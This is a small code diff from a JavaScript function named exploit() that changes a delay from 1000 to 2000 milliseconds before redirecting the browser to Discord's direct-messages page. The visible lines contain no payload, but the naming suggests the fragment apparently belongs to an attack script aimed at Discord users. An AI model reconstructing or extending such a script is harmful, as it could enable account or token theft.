@@ -16,7 +16,7 @@ function exploit() {
 
         setTimeout(() => {
             window.location.href = "https://discord.com/channels/@me"
-        }, 1000);
+        }, 2000);
     } else if(!window.location.search){
         
     }
